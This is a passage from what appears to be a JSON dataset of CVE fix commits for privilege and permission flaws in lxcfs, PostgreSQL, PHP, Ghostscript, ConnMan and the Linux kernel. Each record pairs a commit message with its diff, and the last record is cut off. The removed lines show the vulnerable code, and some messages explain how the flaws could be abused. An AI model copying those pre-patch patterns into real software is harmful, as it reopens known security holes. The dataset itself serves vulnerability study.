basename(d);\n+\td = dirname(d);\n+\tfd = open(d, O_RDONLY);\n+\tif (fd < 0) {\n+\t\tfprintf(stderr, \"Error in openat test: could not open parent dir\\n\");\n+\t\tfprintf(stderr, \"(this is expected on the second run)\\n\");\n+\t\treturn;\n+\t}\n+\tfd2 = openat(fd, f, O_RDONLY);\n+\tif (fd2 >= 0 || errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at openat of %s\\n\", f);\n+\t\texit(1);\n+\t}\n+\tsize_t len = strlen(path) + strlen(\"\/cgroup.procs\") + 1;\n+\ttmpname = alloca(len);\n+\tsnprintf(tmpname, len, \"%s\/cgroup.procs\", f);\n+\tfd2 = openat(fd, tmpname, O_RDONLY);\n+\tif (fd2 >= 0 || errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at openat of %s\\n\", tmpname);\n+\t\texit(1);\n+\t}\n+\tclose(fd);\n+}\n+\n+int main(int argc, char *argv[])\n+{\n+\tchar *procspath;\n+\tsize_t len;\n+\n+\tif (geteuid() != 0) {\n+\t\tfprintf(stderr, \"Run me as root\\n\");\n+\t\texit(1);\n+\t}\n+\n+\tif (argc != 2)  {\n+\t\tfprintf(stderr, \"Usage: %s [lxcfs_test_cgroup_path]\\n\", argv[0]);\n+\t\texit(1);\n+\t}\n+\n+\t\/* Try syscalls on the directory and on $directory\/cgroup.procs *\/\n+\tlen = strlen(argv[1]) + strlen(\"\/cgroup.procs\") + 1;\n+\tprocspath = alloca(len);\n+\tsnprintf(procspath, len, \"%s\/cgroup.procs\", argv[1]);\n+\n+\ttest_open(argv[1]);\n+\ttest_open(procspath);\n+\ttest_stat(argv[1]);\n+\ttest_stat(procspath);\n+\ttest_access(argv[1]);\n+\ttest_access(procspath);\n+\n+\ttest_bind(argv[1]);\n+\ttest_bind(procspath);\n+\ttest_bindmount(argv[1]);\n+\ttest_bindmount(procspath);\n+\ttest_truncate(argv[1]);\n+\ttest_truncate(procspath);\n+\ttest_chdir(argv[1]);\n+\ttest_chdir(procspath);\n+\ttest_rename(argv[1]);\n+\ttest_rename(procspath);\n+\ttest_mkdir(argv[1]);\n+\ttest_mkdir(procspath);\n+\ttest_rmdir(argv[1]);\n+\ttest_rmdir(procspath);\n+\ttest_creat(argv[1]);\n+\ttest_creat(procspath);\n+\ttest_link(argv[1]);\n+\ttest_link(procspath);\n+\ttest_unlink(argv[1]);\n+\ttest_unlink(procspath);\n+\ttest_symlink(argv[1]);\n+\ttest_symlink(procspath);\n+\ttest_readlink(argv[1]);\n+\ttest_readlink(procspath);\n+\ttest_chmod(argv[1]);\n+\ttest_chmod(procspath);\n+\ttest_chown(argv[1]);\n+\ttest_chown(procspath);\n+\ttest_lchown(argv[1]);\n+\ttest_lchown(procspath);\n+\ttest_mknod(argv[1]);\n+\ttest_mknod(procspath);\n+\ttest_chroot(argv[1]);\n+\ttest_chroot(procspath);\n+\ttest_xattrs(argv[1]);\n+\ttest_xattrs(procspath);\n+\ttest_utimes(argv[1]);\n+\ttest_utimes(procspath);\n+\n+\ttest_openat(argv[1]);\n+\t\/\/ meh...  linkat etc?\n+\n+\tprintf(\"All tests passed\\n\");\n+\treturn 0;\n+}\n","owner":"lxc","repo":"lxcfs","source":"cve"},{"CVE_ID":"CVE-2016-3065","CWE_ID":"264","category":"security","commit_id":"bf78a6f107949fdfb513d1b45e30cefe04e09e4f","commit_message":"From bf78a6f107949fdfb513d1b45e30cefe04e09e4f Mon Sep 17 00:00:00 2001\nFrom: Alvaro Herrera <alvherre@alvh.no-ip.org>\nDate: Mon, 28 Mar 2016 10:57:42 -0300\nSubject: [PATCH] Add missing checks to some of pageinspect's BRIN functions\n\nbrin_page_type() and brin_metapage_info() did not enforce being called\nby superuser, like other pageinspect functions that take bytea do.\nSince they don't verify the passed page thoroughly, it is possible to\nuse them to read the server memory with a carefully crafted bytea value,\nup to a file kilobytes from where the input bytea is located.\n\nHave them throw errors if called by a non-superuser.\n\nReport and initial patch: Andreas Seltenreich\n\nSecurity: CVE-2016-3065\n---\n contrib\/pageinspect\/brinfuncs.c | 25 +++++++++++++++++++++++--\n 1 file changed, 23 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/contrib\/pageinspect\/brinfuncs.c b\/contrib\/pageinspect\/brinfuncs.c\nindex a3d4cc5ef3..d879783329 100644\n--- a\/contrib\/pageinspect\/brinfuncs.c\n+++ b\/contrib\/pageinspect\/brinfuncs.c\n@@ -46,8 +46,23 @@ brin_page_type(PG_FUNCTION_ARGS)\n {\n \tbytea\t   *raw_page = PG_GETARG_BYTEA_P(0);\n \tPage\t\tpage = VARDATA(raw_page);\n+\tint\t\t\traw_page_size;\n \tchar\t   *type;\n \n+\tif (!superuser())\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_INSUFFICIENT_PRIVILEGE),\n+\t\t\t\t (errmsg(\"must be superuser to use raw page functions\"))));\n+\n+\traw_page_size = VARSIZE(raw_page) - VARHDRSZ;\n+\n+\tif (raw_page_size != BLCKSZ)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_INVALID_PARAMETER_VALUE),\n+\t\t\t\t errmsg(\"input page too small\"),\n+\t\t\t\t errdetail(\"Expected size %d, got %d\",\n+\t\t\t\t\t\t   BLCKSZ, raw_page_size)));\n+\n \tswitch (BrinPageType(page))\n \t{\n \t\tcase BRIN_PAGETYPE_META:\n@@ -79,11 +94,12 @@ verify_brin_page(bytea *raw_page, uint16 type, const char *strtype)\n \n \traw_page_size = VARSIZE(raw_page) - VARHDRSZ;\n \n-\tif (raw_page_size < SizeOfPageHeaderData)\n+\tif (raw_page_size != BLCKSZ)\n \t\tereport(ERROR,\n \t\t\t\t(errcode(ERRCODE_INVALID_PARAMETER_VALUE),\n \t\t\t\t errmsg(\"input page too small\"),\n-\t\t\t  errdetail(\"Expected size %d, got %d\", raw_page_size, BLCKSZ)));\n+\t\t\t\t errdetail(\"Expected size %d, got %d\",\n+\t\t\t\t\t\t   BLCKSZ, raw_page_size)));\n \n \tpage = VARDATA(raw_page);\n \n@@ -316,6 +332,11 @@ brin_metapage_info(PG_FUNCTION_ARGS)\n \tbool\t\tnulls[4];\n \tHeapTuple\thtup;\n \n+\tif (!superuser())\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_INSUFFICIENT_PRIVILEGE),\n+\t\t\t\t (errmsg(\"must be superuser to use raw page functions\"))));\n+\n \tpage = verify_brin_page(raw_page, BRIN_PAGETYPE_META, \"metapage\");\n \n \t\/* Build a tuple descriptor for our result type *\/\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-2348","CWE_ID":"264","category":"security","commit_id":"1291d6bbee93b6109eb07e8f7916ff1b7fcc13e1","commit_message":"From 1291d6bbee93b6109eb07e8f7916ff1b7fcc13e1 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Tue, 17 Mar 2015 12:47:58 -0700\nSubject: [PATCH] Fix bug #69207 - move_uploaded_file allows nulls in path\n\n---\n NEWS                           | 3 +++\n ext\/standard\/basic_functions.c | 2 +-\n 2 files changed, 4 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex b8dad75..9b45a99 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -2,6 +2,9 @@ PHP                                                                        NEWS\n |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\n ?? ??? 2015 PHP 5.4.39\n \n+- Core:\n+  . Fixed bug #69207 (move_uploaded_file allows nulls in path). (Stas)\n+\n 19 Feb 2015 PHP 5.4.38\n \n - Core:\ndiff --git a\/ext\/standard\/basic_functions.c b\/ext\/standard\/basic_functions.c\nindex 9a9df30..c3e2230 100644\n--- a\/ext\/standard\/basic_functions.c\n+++ b\/ext\/standard\/basic_functions.c\n@@ -5775,7 +5775,7 @@ PHP_FUNCTION(move_uploaded_file)\n \t\tRETURN_FALSE;\n \t}\n \n-\tif (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"ss\", &path, &path_len, &new_path, &new_path_len) == FAILURE) {\n+\tif (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"sp\", &path, &path_len, &new_path, &new_path_len) == FAILURE) {\n \t\treturn;\n \t}\n \n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-16509","CWE_ID":"264","category":"security","commit_id":"5516c614dc33662a2afdc377159f70218e67bde5","commit_message":"From 5516c614dc33662a2afdc377159f70218e67bde5 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Fri, 24 Aug 2018 09:26:04 +0100\nSubject: [PATCH] Improve restore robustness\n\nPrompted by looking at Bug 699654:\n\nThere are two variants of the restore operator in Ghostscript: one is Level 1\n(restoring VM), the other is Level 2+ (adding page device restoring to the\nLevel operator).\n\nThis was implemented by the Level 2+ version restoring the device in the\ngraphics state, then calling the Level 1 implementation to handle actually\nrestoring the VM state.\n\nThe problem was that the operand checking, and sanity of the save object was\nonly done by the Level 1 variant, thus meaning an invalid save object could\nleave a (Level 2+) restore partially complete - with the page device part\nrestored, but not VM, and the page device not configured.\n\nTo solve that, this commit splits the operand and sanity checking, and the\ncore of the restore operation into separate functions, so the relevant\noperators can validate the operand *before* taking any further action. That\nreduces the chances of an invalid restore leaving the interpreter in an\nunknown state.\n\nIf an error occurs during the actual VM restore it is essentially fatal, and the\ninterpreter cannot continue, but as an extra surety for security, in the event\nof such an error, we'll explicitly preserve the LockSafetyParams of the device,\nrather than rely on the post-restore device configuration (which won't happen\nin the event of an error).\n---\n psi\/int.mak    |  4 ++--\n psi\/isave.h    |  6 ++++++\n psi\/zdevice2.c | 33 +++++++++++++++++++++++++++++----\n psi\/zvmem.c    | 56 +++++++++++++++++++++++++++++++++++++++++++++++---------\n 4 files changed, 84 insertions(+), 15 deletions(-)\n\n","diff_code":"diff --git a\/psi\/int.mak b\/psi\/int.mak\nindex 1968820..16db0cf 100644\n--- a\/psi\/int.mak\n+++ b\/psi\/int.mak\n@@ -1086,8 +1086,8 @@ $(PSD)pagedev.dev : $(ECHOGS_XE) $(pagedev_)\\\n \n $(PSOBJ)zdevice2.$(OBJ) : $(PSSRC)zdevice2.c $(OP) $(math__h) $(memory__h)\\\n  $(dstack_h) $(estack_h)\\\n- $(idict_h) $(idparam_h) $(igstate_h) $(iname_h) $(iutil_h) $(store_h)\\\n- $(gxdevice_h) $(gsstate_h) $(INT_MAK) $(MAKEDIRS)\n+ $(idict_h) $(idparam_h) $(igstate_h) $(iname_h) $(isave) $(iutil_h) \\\n+ $(store_h) $(gxdevice_h) $(gsstate_h) $(INT_MAK) $(MAKEDIRS)\n \t$(PSCC) $(PSO_)zdevice2.$(OBJ) $(C_) $(PSSRC)zdevice2.c\n \n $(PSOBJ)zmedia2.$(OBJ) : $(PSSRC)zmedia2.c $(OP) $(math__h) $(memory__h)\\\ndiff --git a\/psi\/isave.h b\/psi\/isave.h\nindex 3021639..7eaaced 100644\n--- a\/psi\/isave.h\n+++ b\/psi\/isave.h\n@@ -128,4 +128,10 @@ int  font_restore(const alloc_save_t * save);\n    express purpose of getting the library context. *\/\n gs_memory_t *gs_save_any_memory(const alloc_save_t *save);\n \n+int\n+restore_check_save(i_ctx_t *i_ctx_p, alloc_save_t **asave);\n+\n+int\n+dorestore(i_ctx_t *i_ctx_p, alloc_save_t *asave);\n+\n #endif \/* isave_INCLUDED *\/\ndiff --git a\/psi\/zdevice2.c b\/psi\/zdevice2.c\nindex 9fbb4e3..0c7080d 100644\n--- a\/psi\/zdevice2.c\n+++ b\/psi\/zdevice2.c\n@@ -26,6 +26,7 @@\n #include \"igstate.h\"\n #include \"iname.h\"\n #include \"iutil.h\"\n+#include \"isave.h\"\n #include \"store.h\"\n #include \"gxdevice.h\"\n #include \"gsstate.h\"\n@@ -307,13 +308,24 @@ z2grestoreall(i_ctx_t *i_ctx_p)\n     }\n     return 0;\n }\n-\n+\/* This is the Level 2+ variant of restore - which adds restoring\n+   of the page device to the Level 1 variant in zvmem.c.\n+   Previous this restored the device state before calling zrestore.c\n+   which validated operands etc, meaning a restore could error out\n+   partially complete.\n+   The operand checking, and actual VM restore are now in two functions\n+   so they can called separately thus, here, we can do as much\n+   checking as possible, before embarking on actual changes\n+ *\/\n \/* <save> restore - *\/\n static int\n z2restore(i_ctx_t *i_ctx_p)\n {\n-    os_ptr op = osp;\n-    check_type(*op, t_save);\n+    alloc_save_t *asave;\n+    bool saveLockSafety = gs_currentdevice_inline(igs)->LockSafetyParams;\n+    int code = restore_check_save(i_ctx_p, &asave);\n+\n+    if (code < 0) return code;\n \n     while (gs_gstate_saved(gs_gstate_saved(igs))) {\n         if (restore_page_device(igs, gs_gstate_saved(igs)))\n@@ -322,7 +334,20 @@ z2restore(i_ctx_t *i_ctx_p)\n     }\n     if (restore_page_device(igs, gs_gstate_saved(igs)))\n         return push_callout(i_ctx_p, \"%restorepagedevice\");\n-    return zrestore(i_ctx_p);\n+\n+    code = dorestore(i_ctx_p, asave);\n+\n+    if (code < 0) {\n+        \/* An error here is basically fatal, but....\n+           restore_page_device() has to set LockSafetyParams false so it can\n+           configure the restored device correctly - in normal operation, that\n+           gets reset by that configuration. If we hit an error, though, that\n+           may not happen -  at least ensure we keep the setting through the\n+           error.\n+         *\/\n+        gs_currentdevice_inline(igs)->LockSafetyParams = saveLockSafety;\n+    }\n+    return code;\n }\n \n \/* <gstate> setgstate - *\/\ndiff --git a\/psi\/zvmem.c b\/psi\/zvmem.c\nindex 44cd7a8..87a0a4f 100644\n--- a\/psi\/zvmem.c\n+++ b\/psi\/zvmem.c\n@@ -99,19 +99,18 @@ zsave(i_ctx_t *i_ctx_p)\n static int restore_check_operand(os_ptr, alloc_save_t **, gs_dual_memory_t *);\n static int restore_check_stack(const i_ctx_t *i_ctx_p, const ref_stack_t *, const alloc_save_t *, bool);\n static void restore_fix_stack(i_ctx_t *i_ctx_p, ref_stack_t *, const alloc_save_t *, bool);\n+\n+\/* Do as many up front checks of the save object as we reasonably can *\/\n int\n-zrestore(i_ctx_t *i_ctx_p)\n+restore_check_save(i_ctx_t *i_ctx_p, alloc_save_t **asave)\n {\n     os_ptr op = osp;\n-    alloc_save_t *asave;\n-    bool last;\n-    vm_save_t *vmsave;\n-    int code = restore_check_operand(op, &asave, idmemory);\n+    int code = restore_check_operand(op, asave, idmemory);\n \n     if (code < 0)\n         return code;\n     if_debug2m('u', imemory, \"[u]vmrestore 0x%lx, id = %lu\\n\",\n-               (ulong) alloc_save_client_data(asave),\n+               (ulong) alloc_save_client_data(*asave),\n                (ulong) op->value.saveid);\n     if (I_VALIDATE_BEFORE_RESTORE)\n         ivalidate_clean_spaces(i_ctx_p);\n@@ -120,14 +119,37 @@ zrestore(i_ctx_t *i_ctx_p)\n     {\n         int code;\n \n-        if ((code = restore_check_stack(i_ctx_p, &o_stack, asave, false)) < 0 ||\n-            (code = restore_check_stack(i_ctx_p, &e_stack, asave, true)) < 0 ||\n-            (code = restore_check_stack(i_ctx_p, &d_stack, asave, false)) < 0\n+        if ((code = restore_check_stack(i_ctx_p, &o_stack, *asave, false)) < 0 ||\n+            (code = restore_check_stack(i_ctx_p, &e_stack, *asave, true)) < 0 ||\n+            (code = restore_check_stack(i_ctx_p, &d_stack, *asave, false)) < 0\n             ) {\n             osp++;\n             return code;\n         }\n     }\n+    osp++;\n+    return 0;\n+}\n+\n+\/* the semantics of restore differ slightly between Level 1 and\n+   Level 2 and later - the latter includes restoring the device\n+   state (whilst Level 1 didn't have \"page devices\" as such).\n+   Hence we have two restore operators - one here (Level 1)\n+   and one in zdevice2.c (Level 2+). For that reason, the\n+   operand checking and guts of the restore operation are\n+   separated so both implementations can use them to best\n+   effect.\n+ *\/\n+int\n+dorestore(i_ctx_t *i_ctx_p, alloc_save_t *asave)\n+{\n+    os_ptr op = osp;\n+    bool last;\n+    vm_save_t *vmsave;\n+    int code;\n+\n+    osp--;\n+\n     \/* Reset l_new in all stack entries if the new save level is zero. *\/\n     \/* Also do some special fixing on the e-stack. *\/\n     restore_fix_stack(i_ctx_p, &o_stack, asave, false);\n@@ -170,9 +192,24 @@ zrestore(i_ctx_t *i_ctx_p)\n     \/* cause an 'invalidaccess' in setuserparams. Temporarily set     *\/\n     \/* LockFilePermissions false until the gs_lev2.ps can do a        *\/\n     \/* setuserparams from the restored userparam dictionary.          *\/\n+    \/* NOTE: This is safe to do here, since the restore has           *\/\n+    \/* successfully completed - this should never come before any     *\/\n+    \/* operation that can trigger an error                            *\/\n     i_ctx_p->LockFilePermissions = false;\n     return 0;\n }\n+\n+int\n+zrestore(i_ctx_t *i_ctx_p)\n+{\n+    alloc_save_t *asave;\n+    int code = restore_check_save(i_ctx_p, &asave);\n+    if (code < 0)\n+        return code;\n+\n+    return dorestore(i_ctx_p, asave);\n+}\n+\n \/* Check the operand of a restore. *\/\n static int\n restore_check_operand(os_ptr op, alloc_save_t ** pasave,\n@@ -193,6 +230,7 @@ restore_check_operand(os_ptr op, alloc_save_t ** pasave,\n     *pasave = asave;\n     return 0;\n }\n+\n \/* Check a stack to make sure all its elements are older than a save. *\/\n static int\n restore_check_stack(const i_ctx_t *i_ctx_p, const ref_stack_t * pstack,\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2320","CWE_ID":"264","category":"security","commit_id":"b0ec6eb4466acc57a9ea8be52c17b674b6ea0618","commit_message":"From b0ec6eb4466acc57a9ea8be52c17b674b6ea0618 Mon Sep 17 00:00:00 2001\nFrom: Jukka Rissanen <jukka.rissanen@linux.intel.com>\nDate: Thu, 3 May 2012 15:27:22 +0300\nSubject: rtnl: Make sure that we only accept netlink messages from kernel\n\n---\n src\/rtnl.c | 37 ++++++++++++++++++++++++-------------\n 1 file changed, 24 insertions(+), 13 deletions(-)\n\n","diff_code":"diff --git a\/src\/rtnl.c b\/src\/rtnl.c\nindex 3cd6c4b6..e53f5e88 100644\n--- a\/src\/rtnl.c\n+++ b\/src\/rtnl.c\n@@ -1368,10 +1368,11 @@ static void rtnl_message(void *buf, size_t len)\n \t\tif (!NLMSG_OK(hdr, len))\n \t\t\tbreak;\n \n-\t\tDBG(\"%s len %d type %d flags 0x%04x seq %d\",\n+\t\tDBG(\"%s len %d type %d flags 0x%04x seq %d pid %d\",\n \t\t\t\t\ttype2string(hdr->nlmsg_type),\n \t\t\t\t\thdr->nlmsg_len, hdr->nlmsg_type,\n-\t\t\t\t\thdr->nlmsg_flags, hdr->nlmsg_seq);\n+\t\t\t\t\thdr->nlmsg_flags, hdr->nlmsg_seq,\n+\t\t\t\t\thdr->nlmsg_pid);\n \n \t\tswitch (hdr->nlmsg_type) {\n \t\tcase NLMSG_NOOP:\n@@ -1417,27 +1418,37 @@ static gboolean netlink_event(GIOChannel *chan,\n \t\t\t\tGIOCondition cond, gpointer data)\n {\n \tunsigned char buf[4096];\n-\tgsize len;\n-\tGIOStatus status;\n+\tstruct sockaddr_nl nladdr;\n+\tsocklen_t addr_len = sizeof(nladdr);\n+\tssize_t status;\n+\tint fd;\n \n \tif (cond & (G_IO_NVAL | G_IO_HUP | G_IO_ERR))\n \t\treturn FALSE;\n \n \tmemset(buf, 0, sizeof(buf));\n+\tmemset(&nladdr, 0, sizeof(nladdr));\n \n-\tstatus = g_io_channel_read_chars(chan, (gchar *) buf,\n-\t\t\t\t\t\tsizeof(buf), &len, NULL);\n+\tfd = g_io_channel_unix_get_fd(chan);\n+\n+\tstatus = recvfrom(fd, buf, sizeof(buf), 0,\n+                       (struct sockaddr *) &nladdr, &addr_len);\n+\tif (status < 0) {\n+\t\tif (errno == EINTR || errno == EAGAIN)\n+\t\t\treturn TRUE;\n \n-\tswitch (status) {\n-\tcase G_IO_STATUS_NORMAL:\n-\t\tbreak;\n-\tcase G_IO_STATUS_AGAIN:\n-\t\treturn TRUE;\n-\tdefault:\n \t\treturn FALSE;\n \t}\n \n-\trtnl_message(buf, len);\n+\tif (status == 0)\n+\t\treturn FALSE;\n+\n+\tif (nladdr.nl_pid != 0) { \/* not sent by kernel, ignore *\/\n+\t\tDBG(\"Received msg from %u, ignoring it\", nladdr.nl_pid);\n+\t\treturn TRUE;\n+\t}\n+\n+\trtnl_message(buf, status);\n \n \treturn TRUE;\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-0914","CWE_ID":"264","category":"security","commit_id":"2ca39528c01a933f6689cd6505ce65bd6d68a530","commit_message":"From 2ca39528c01a933f6689cd6505ce65bd6d68a530 Mon Sep 17 00:00:00 2001\nFrom: Kees Cook <keescook@chromium.org>\nDate: Wed, 13 Mar 2013 14:59:33 -0700\nSubject: signal: always clear sa_restorer on execve\n\nWhen the new signal handlers are set up, the location of sa_restorer is\nnot cleared, leaking a parent process's address space location to\nchildren.  This allows for a potential bypass of the parent's ASLR by\nexamining the sa_restorer value returned when calling sigaction().\n\nBased on what should be considered \"secret\" about addresses, it only\nmatters across the exec not the fork (since the VMAs haven't changed\nuntil the exec).  But since exec sets SIG_DFL and keeps sa_restorer,\nthis is where it should be fixed.\n\nGiven the few uses of sa_restorer, a \"set\" function was not written\nsince this would be the only use.  Instead, we use\n__ARCH_HAS_SA_RESTORER, as already done in other places.\n\nExample of the leak before applying this patch:\n\n  $ cat \/proc\/$$\/maps\n  ...\n  7fb9f3083000-7fb9f3238000 r-xp 00000000 fd:01 404469 ...\/libc-2.15.so\n  ...\n  $ .\/leak\n  ...\n  7f278bc74000-7f278be29000 r-xp 00000000 fd:01 404469 ...\/libc-2.15.so\n  ...\n  1 0 (nil) 0x7fb9f30b94a0\n  2 4000000 (nil) 0x7f278bcaa4a0\n  3 4000000 (nil) 0x7f278bcaa4a0\n  4 0 (nil) 0x7fb9f30b94a0\n  ...\n\n[akpm@linux-foundation.org: use SA_RESTORER for backportability]\nSigned-off-by: Kees Cook <keescook@chromium.org>\nReported-by: Emese Revfy <re.emese@gmail.com>\nCc: Emese Revfy <re.emese@gmail.com>\nCc: PaX Team <pageexec@freemail.hu>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: \"Eric W. Biederman\" <ebiederm@xmission.com>\nCc: Serge Hallyn <serge.hallyn@canonical.com>\nCc: Julien Tinnes <jln@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/signal.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/kernel\/signal.c b\/kernel\/signal.c\nindex d63c79e7e415..43b0d4a1b7ba 100644\n--- a\/kernel\/signal.c\n+++ b\/kernel\/signal.c\n@@ -485,6 +485,9 @@ flush_signal_handlers(struct task_struct *t, int force_default)\n \t\tif (force_default || ka->sa.sa_handler != SIG_IGN)\n \t\t\tka->sa.sa_handler = SIG_DFL;\n \t\tka->sa.sa_flags = 0;\n+#ifdef SA_RESTORER\n+\t\tka->sa.sa_restorer = NULL;\n+#endif\n \t\tsigemptyset(&ka->sa.sa_mask);\n \t\tka++;\n \t}\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-4300","CWE_ID":"264","category":"security","commit_id":"d661684cf6820331feae71146c35da83d794467e","commit_message":"From d661684cf6820331feae71146c35da83d794467e Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@amacapital.net>\nDate: Thu, 22 Aug 2013 11:39:15 -0700\nSubject: [PATCH] net: Check the correct namespace when spoofing pid over\n SCM_RIGHTS\n\nThis is a security bug.\n\nThe follow-up will fix nsproxy to discourage this type of issue from\nhappening again.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nReviewed-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/core\/scm.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/core\/scm.c b\/net\/core\/scm.c\nindex 03795d0147f29..b4da80b1cc07d 100644\n--- a\/net\/core\/scm.c\n+++ b\/net\/core\/scm.c\n@@ -54,7 +54,7 @@ static __inline__ int scm_check_creds(struct ucred *creds)\n \t\treturn -EINVAL;\n \n \tif ((creds->pid == task_tgid_vnr(current) ||\n-\t     ns_capable(current->nsproxy->pid_ns->user_ns, CAP_SYS_ADMIN)) &&\n+\t     ns_capable(task_active_pid_ns(current)->user_ns, CAP_SYS_ADMIN)) &&\n \t    ((uid_eq(uid, cred->uid)   || uid_eq(uid, cred->euid) ||\n \t      uid_eq(uid, cred->suid)) || nsown_capable(CAP_SETUID)) &&\n \t    ((gid_eq(gid, cred->gid)   || gid_eq(gid, cred->egid) ||\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"0067bd8a55862ac9dd212bd1c4f6f5bff1ca1301","commit_message":"From 0067bd8a55862ac9dd212bd1c4f6f5bff1ca1301 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 30 Nov 2009 17:34:06 -0500\nSubject: Cut hugetlb case early for 32bit on ia64\n\nIt won't work anyway (hugetlb addresses there are way beyond 4Gb)\nand it's easier to stop it here.\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/ia64\/ia32\/sys_ia32.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/arch\/ia64\/ia32\/sys_ia32.c b\/arch\/ia64\/ia32\/sys_ia32.c\nindex 429ec968c9ee..045b746b9808 100644\n--- a\/arch\/ia64\/ia32\/sys_ia32.c\n+++ b\/arch\/ia64\/ia32\/sys_ia32.c\n@@ -858,6 +858,9 @@ ia32_do_mmap (struct file *file, unsigned long addr, unsigned long len, int prot\n \n \tprot = get_prot32(prot);\n \n+\tif (flags & MAP_HUGETLB)\n+\t\treturn -ENOMEM;\n+\n #if PAGE_SHIFT > IA32_PAGE_SHIFT\n \tmutex_lock(&ia32_mmap_mutex);\n \t{\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-16509","CWE_ID":"264","category":"security","commit_id":"78911a01b67d590b4a91afac2e8417360b934156","commit_message":"From 78911a01b67d590b4a91afac2e8417360b934156 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Thu, 23 Aug 2018 09:54:59 +0100\nSubject: [PATCH] Bug 699654: Check the restore operand type\n\nThe primary function that implements restore correctly checked its parameter,\nbut a function that does some preliminary work for the restore (gstate and\ndevice handling) did not check.\n\nSo, even though the restore correctly errored out, it left things partially done\nand, in particular, the device in partially restored state. Meaning the\nLockSafetyParams was not correctly set.\n---\n psi\/zdevice2.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/psi\/zdevice2.c b\/psi\/zdevice2.c\nindex de16dd2..9fbb4e3 100644\n--- a\/psi\/zdevice2.c\n+++ b\/psi\/zdevice2.c\n@@ -312,6 +312,9 @@ z2grestoreall(i_ctx_t *i_ctx_p)\n static int\n z2restore(i_ctx_t *i_ctx_p)\n {\n+    os_ptr op = osp;\n+    check_type(*op, t_save);\n+\n     while (gs_gstate_saved(gs_gstate_saved(igs))) {\n         if (restore_page_device(igs, gs_gstate_saved(igs)))\n             return push_callout(i_ctx_p, \"%restore1pagedevice\");\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-1959","CWE_ID":"264","category":"security","commit_id":"6708075f104c3c9b04b23336bb0366ca30c3931b","commit_message":"From 6708075f104c3c9b04b23336bb0366ca30c3931b Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Sun, 14 Apr 2013 13:47:02 -0700\nSubject: userns: Don't let unprivileged users trick privileged users into\n setting the id_map\n\nWhen we require privilege for setting \/proc\/<pid>\/uid_map or\n\/proc\/<pid>\/gid_map no longer allow an unprivileged user to\nopen the file and pass it to a privileged program to write\nto the file.\n\nInstead when privilege is required require both the opener and the\nwriter to have the necessary capabilities.\n\nI have tested this code and verified that setting \/proc\/<pid>\/uid_map\nfails when an unprivileged user opens the file and a privielged user\nattempts to set the mapping, that unprivileged users can still map\ntheir own id, and that a privileged users can still setup an arbitrary\nmapping.\n\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\n---\n kernel\/user_namespace.c | 12 ++++++++----\n 1 file changed, 8 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/user_namespace.c b\/kernel\/user_namespace.c\nindex a54f26f82eb2..e2d4ace4481b 100644\n--- a\/kernel\/user_namespace.c\n+++ b\/kernel\/user_namespace.c\n@@ -25,7 +25,8 @@\n \n static struct kmem_cache *user_ns_cachep __read_mostly;\n \n-static bool new_idmap_permitted(struct user_namespace *ns, int cap_setid,\n+static bool new_idmap_permitted(const struct file *file,\n+\t\t\t\tstruct user_namespace *ns, int cap_setid,\n \t\t\t\tstruct uid_gid_map *map);\n \n static void set_cred_user_ns(struct cred *cred, struct user_namespace *user_ns)\n@@ -700,7 +701,7 @@ static ssize_t map_write(struct file *file, const char __user 